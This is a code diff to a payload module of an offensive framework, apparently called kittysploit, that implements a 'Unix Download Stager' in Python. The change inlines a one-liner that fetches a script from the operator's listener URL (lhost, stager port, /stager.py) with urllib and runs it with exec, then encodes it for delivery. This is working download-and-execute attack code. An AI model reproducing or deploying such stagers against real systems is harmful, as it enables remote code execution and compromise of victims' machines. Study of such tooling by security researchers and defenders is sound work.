@@ -3,10 +3,12 @@
 
 from kittysploit import *
 
-from lib.c2.download_stagers import build_python_urllib_pipe_python, build_stager_url
+from lib.c2.download_stagers import build_stager_url
 
 
 class Module(Payload):
+    CLIENT_LANGUAGE = "python"
+
     __info__ = {
         "name": "Unix Download Stager, python urllib",
         "description": (
@@ -31,4 +33,8 @@ class Module(Payload):
         if not url:
             url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.py")
             print_info(f"stager_url not set — using {url}")
-        return build_python_urllib_pipe_python(url, str(self.python_binary or "python3"))
+        script = (
+            "import urllib.request,sys;"
+            f"exec(urllib.request.urlopen({url!r},timeout=30).read().decode())"
+        )
+        return self._encode_python_one_liner(script, self.python_binary)
